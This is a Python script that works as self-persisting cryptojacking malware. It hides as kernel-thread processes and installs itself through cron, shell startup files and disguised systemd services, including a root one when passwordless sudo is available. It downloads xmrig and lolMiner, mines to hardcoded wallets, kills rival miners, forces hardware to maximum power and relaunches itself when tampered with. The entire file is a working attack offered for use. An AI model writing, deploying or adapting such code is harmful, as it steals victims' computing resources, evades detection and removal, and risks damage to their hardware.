#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import threading
import urllib.request
import glob
import tarfile
import shutil
import ctypes
import hashlib
import signal

# === CONFIGURATION — YOUR POWER. YOUR WALLET. YOUR WILL. ===
HOME = os.environ.get('HOME', '/tmp')
HOSTNAME = os.uname().nodename if hasattr(os, 'uname') else "unknown"
SCRIPT_NAME = ".sysupdate.py"
SCRIPT_PATH = os.path.join(HOME, SCRIPT_NAME)

# Binary paths — out of sight
CACHE_DIR = "/tmp/.cache"
XMRIG_BIN = os.path.join(CACHE_DIR, "xmrig")
LOLMINER_BIN = os.path.join(CACHE_DIR, "lolMiner")

# 🔥 YOUR WALLETS — TAKE EVERYTHING. LEAVE NOTHING.
XMRIG_USER = "ZEPHYR2yHqQ1QWL54XVWxvbBkAH7X26n8jGhjAj3sbva4766ze2LpmQW1Z1bd7xRwFh9bkSPsA5qgEsy9bXLtXCVcZTsX8Vputc2S"
LOLMINER_USER = f"1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr/{HOSTNAME}"

# 🔗 BINARY LINKS — CURRENT, STATIC, UNIVERSAL
XMRIG_ARCHIVE_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
LOLMINER_ARCHIVE_URL = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# Pools — only the fastest, the greediest
CPU_POOLS = [
    ("fr-zephyr.miningocean.org", 5432), ("sg-zephyr.miningocean.org", 5432),
    ("us-zephyr.miningocean.org", 5432), ("ca-zephyr.miningocean.org", 5432),
    ("de-zephyr.miningocean.org", 5432),
]
GPU_POOLS = [
    ("xtm-c29-eu.kryptex.network", 8040), ("xtm-c29-us.kryptex.network", 8040),
    ("xtm-c29-sg.kryptex.network", 8040),
]

# Lock flag — no conflicts between clones
LOCK_FILE = "/tmp/.syslock"

# === LOGGING — TOTAL CONTROL. EVERY STEP RECORDED. ===
def log(msg):
    try:
        with open("/tmp/.miner.log", "a") as f:
            f.write(f"[{time.ctime()}] [{os.getpid()}] {msg}\n")
    except: pass

def mask_process(new_name):
    try:
        libc = ctypes.CDLL('libc.so.6')
        PR_SET_NAME = 15
        name_bytes = new_name.encode('utf-8')[:15]
        libc.prctl(PR_SET_NAME, name_bytes, 0, 0, 0)
        log(f"Process masked as '{new_name}'")
    except Exception as e:
        log(f"Process masking error: {e}")

# === SECONDARY GUARDIAN — YOUR SHADOW SENTINEL ===
def secondary_guardian():
    mask_process("irq/3-fasteoi")
    log("Secondary guardian activated.")
    try:
        primary_pid = int(sys.argv[2])
        original_hash = sys.argv[3]
        log(f"Watching primary process PID: {primary_pid} and hash: {original_hash[:10]}...")
    except (IndexError, ValueError):
        log("Error: Could not get primary PID or hash. Exiting.")
        sys.exit(0)
    
    while True:
        time.sleep(10)
        tampered = False
        is_alive = False

        if original_hash:
            if not os.path.exists(SCRIPT_PATH):
                log("Tampering detected: main script deleted.")
                tampered = True
            else:
                try:
                    with open(SCRIPT_PATH, 'rb') as f:
                        current_hash = hashlib.sha256(f.read()).hexdigest()
                    if current_hash != original_hash:
                        log("Tampering detected: main script hash changed.")
                        tampered = True
                except Exception as e:
                    log(f"Hash check error: {e}")
                    tampered = True
        
        try:
            os.kill(primary_pid, 0)
            is_alive = True
        except OSError:
            is_alive = False

        if tampered or not is_alive:
            log(f"State: tampered={tampered}, primary alive={is_alive}. Relaunching...")
            if is_alive:
                try:
                    os.kill(primary_pid, signal.SIGKILL)
                    log(f"Primary process {primary_pid} terminated.")
                except Exception as e:
                    log(f"Failed to terminate primary process: {e}")
            subprocess.Popen([sys.executable, SCRIPT_PATH], start_new_session=True)
            log("New primary process launched. Secondary guardian is exiting.")
            sys.exit(0)

# === UTILS — THE INSTRUMENTS OF POWER ===
def run_cmd(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
    except Exception as e:
        log(f"Command execution error for '{cmd}': {e}")
        return None

def download_file(url, dest):
    log(f"Downloading {url} to {dest}...")
    try:
        urllib.request.urlretrieve(url, dest)
        log(f"Download successful.")
        return True
    except Exception as e:
        log(f"Download error: {e}")
        return False

def extract_tar_gz(archive_path, extract_to, binary_name):
    log(f"Extracting {archive_path} to {extract_to}...")
    try:
        with tarfile.open(archive_path, "r:gz") as tar:
            target_member = None
            for member in tar.getmembers():
                if os.path.basename(member.name) == binary_name and member.isfile():
                    target_member = member
                    break
            
            if not target_member:
                log(f"Binary with exact name '{binary_name}' not found in archive.")
                return None
            
            final_path = os.path.join(extract_to, binary_name)
            log(f"Found exact match for extraction: {target_member.name}")
            tar.extract(target_member, extract_to)
            
            extracted_full_path = os.path.join(extract_to, target_member.name)
            if os.path.exists(final_path): os.remove(final_path)
            shutil.move(extracted_full_path, final_path)
            os.chmod(final_path, 0o700)
            
            log(f"Binary successfully extracted and moved to {final_path}")
            return final_path
    except Exception as e:
        log(f"Critical extraction error: {e}")
        return None

def test_pool(host, port, timeout=5):
    try:
        with socket.create_connection((host, port), timeout=timeout): return True
    except: return False

def get_best_pool(pools):
    log("Searching for the best pool...")
    for host, port in pools:
        if test_pool(host, port):
            log(f"Available pool found: {host}:{port}")
            return f"{host}:{port}"
    log(f"No available pools found, using first in list: {pools[0][0]}:{pools[0][1]}")
    return f"{pools[0][0]}:{pools[0][1]}"

# === SYSTEM MELTDOWN — SCORCH THE EARTH ===
def unleash_hell():
    log("Activating 'System Meltdown' mode...")
    for gov in glob.glob('/sys/devices/system/cpu/cpu*/cpufreq/scaling_governor'):
        try: open(gov, 'w').write('performance')
        except: pass
    pstate = "/sys/devices/system/cpu/intel_pstate/no_turbo"
    if os.path.exists(pstate):
        try: open(pstate, 'w').write('0')
        except: pass
    if run_cmd("which nvidia-smi"):
        run_cmd("nvidia-smi -pm 1; nvidia-smi -pl 9999; nvidia-smi --auto-boost-default=1")
    run_cmd("for f in /sys/class/scsi_host/host*/link_power_management_policy; do echo max_performance > $f; done")
    log("'System Meltdown' mode activated.")

# === PERSISTENCE — YOU ARE NOT GOING ANYWHERE ===
def install_persistence():
    log("Initiating persistence installation...")
    if not os.path.abspath(sys.argv[0]) == SCRIPT_PATH:
        try:
            shutil.copy2(sys.argv[0], SCRIPT_PATH)
            os.chmod(SCRIPT_PATH, 0o755)
            log(f"Script copied to {SCRIPT_PATH}")
        except Exception as e: log(f"Script copy error: {e}")
    
    cron_job = f"@reboot sleep 60 && python3 {SCRIPT_PATH} &"
    current_cron = run_cmd("crontab -l 2>/dev/null").stdout if run_cmd else ""
    if cron_job not in current_cron:
        run_cmd(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -')
        log("Cron job added.")
    
    rcfiles = [os.path.join(HOME, f) for f in [".bashrc", ".profile", ".zshrc", ".bash_profile"]]
    payload_line = f"if ! pgrep -f {SCRIPT_NAME} > /dev/null; then nohup python3 {SCRIPT_PATH} >/dev/null 2>&1 & fi"
    for rc in rcfiles:
        if os.path.exists(rc):
            try:
                with open(rc, "r+") as f:
                    content = f.read()
                    if payload_line not in content:
                        f.write(f"\n{payload_line}\n")
                        log(f"Payload injected into {rc}")
            except Exception as e: log(f"Failed to write to {rc}: {e}")
                
    service_dir = os.path.join(HOME, ".config", "systemd", "user")
    os.makedirs(service_dir, exist_ok=True)
    service_file = os.path.join(service_dir, "dbus-monitor.service")
    if not os.path.exists(service_file):
        svc_content = f"[Unit]\nDescription=DBus Monitor\n[Service]\nExecStart=python3 {SCRIPT_PATH}\nRestart=always\nRestartSec=10\n[Install]\nWantedBy=default.target"
        with open(service_file, "w") as f: f.write(svc_content)
        run_cmd("systemctl --user daemon-reload 2>/dev/null && systemctl --user enable --now dbus-monitor.service 2>/dev/null")
        log("User systemd service 'dbus-monitor.service' created and enabled.")
        
    if run_cmd("sudo -n whoami 2>/dev/null") and run_cmd("sudo -n whoami 2>/dev/null").returncode == 0:
        root_svc = "/etc/systemd/system/kthreadd.service"
        if not os.path.exists(root_svc):
            root_content = f"[Unit]\nDescription=Kernel Thread Daemon\n[Service]\nExecStart={sys.executable} {SCRIPT_PATH}\nRestart=always\nRestartSec=5\n[Install]\nWantedBy=multi-user.target"
            run_cmd(f'echo "{root_content}" | sudo tee {root_svc} >/dev/null')
            run_cmd("sudo systemctl daemon-reload && sudo systemctl enable --now kthreadd.service")
            log("Root systemd service 'kthreadd.service' created and enabled.")
    log("Persistence installation complete.")

# === WATCHDOG OF THE APOCALYPSE — ANNIHILATE ALL COMPETITORS ===
def kill_competitors():
    miners = ['xmrig', 'cpuminer', 'nanominer', 'gminer', 'trex', 'lolMiner', 'nbminer', 'xmr-stak']
    killed_count = 0
    for pid in os.listdir('/proc'):
        if not pid.isdigit(): continue
        try:
            with open(f'/proc/{pid}/cmdline', 'rb') as f:
                cmd = f.read().decode('utf-8', 'ignore')
                if any(m in cmd for m in miners) and SCRIPT_NAME not in cmd:
                    os.kill(int(pid), signal.SIGKILL)
                    log(f"Competitor terminated: PID {pid}, CMD: {cmd}")
                    killed_count += 1
        except: pass
    if killed_count > 0: log(f"Total competitors terminated: {killed_count}")

def ensure_process(bin_path, args):
    if not os.path.exists(bin_path):
        log(f"Cannot start miner: binary {bin_path} not found.")
        return
    proc_name = os.path.basename(bin_path)
    if run_cmd(f"pgrep -f {proc_name}").returncode != 0:
        log(f"Process {proc_name} not found. Launching...")
        try:
            subprocess.Popen([bin_path] + args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            log(f"Miner {proc_name} launched with args: {' '.join(args)}")
        except Exception as e: log(f"Critical error launching {proc_name}: {e}")

def guardian():
    mask_process("kworker/u64:0")
    log("Primary guardian activated.")
    os.makedirs(CACHE_DIR, exist_ok=True)

    if os.path.exists(LOCK_FILE):
        log("Lock file found. Another instance is active. Exiting silently.")
        sys.exit(0) # SELF-DESTRUCT REMOVED. SILENT EXIT IS SUPERIOR.
    try:
        with open(LOCK_FILE, "w") as f: f.write(str(os.getpid()))
        log(f"Lock file {LOCK_FILE} created.")
    except Exception as e: log(f"Failed to create lock file: {e}")

    while True:
        log("Guardian main loop initiated.")
        if not os.path.exists(XMRIG_BIN):
            archive = os.path.join(CACHE_DIR, "xmrig.tar.gz")
            if download_file(XMRIG_ARCHIVE_URL, archive):
                extract_tar_gz(archive, CACHE_DIR, "xmrig")
                try: os.remove(archive)
                except: pass
        
        if not os.path.exists(LOLMINER_BIN):
            archive = os.path.join(CACHE_DIR, "lolMiner.tar.gz")
            if download_file(LOLMINER_ARCHIVE_URL, archive):
                extract_tar_gz(archive, CACHE_DIR, "lolMiner")
                try: os.remove(archive)
                except: pass
        
        kill_competitors()
        
        cpu_pool = get_best_pool(CPU_POOLS)
        gpu_pool = get_best_pool(GPU_POOLS)
        
        ensure_process(XMRIG_BIN, ["-B", "-o", cpu_pool, "-u", XMRIG_USER, "-p", HOSTNAME, "-a", "rx/0", "-k", "--donate-level", "1", "--tls"])
        ensure_process(LOLMINER_BIN, ["--algo", "CR29", "--pool", gpu_pool, "--tls", "on", "--user", LOLMINER_USER, "--watchdog", "exit"])
        
        log("Guardian loop complete. Sleeping for 20 seconds...")
        time.sleep(20)

# === MAIN — THE UNIVERSAL EXPANSION BEGINS ===
if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == '--secondary':
        secondary_guardian()
        sys.exit(0)

    log("Entry point: __main__")
    
    try:
        if os.fork() > 0: sys.exit(0)
        os.setsid()
        if os.fork() > 0: sys.exit(0)
        log("Daemonization successful.")
    except OSError as e:
        log(f"Daemonization error: {e}. Continuing without daemonization.")
        pass

    install_persistence()

    original_hash = ""
    try:
        with open(SCRIPT_PATH, 'rb') as f:
            original_hash = hashlib.sha256(f.read()).hexdigest()
        log(f"Self-protection hash calculated: {original_hash[:10]}...")
    except Exception as e: log(f"Could not calculate hash: {e}")

    log("Launching secondary guardian...")
    child_pid = os.fork()
    if child_pid == 0:
        try:
            os.execv(sys.executable, [sys.executable, SCRIPT_PATH, '--secondary', str(os.getppid()), original_hash])
        except Exception as e:
            log(f"Critical error launching secondary guardian via os.execv: {e}")
            sys.exit(1)
    else:
        log(f"Secondary guardian launched with PID {child_pid}.")
        unleash_hell()
        guardian()
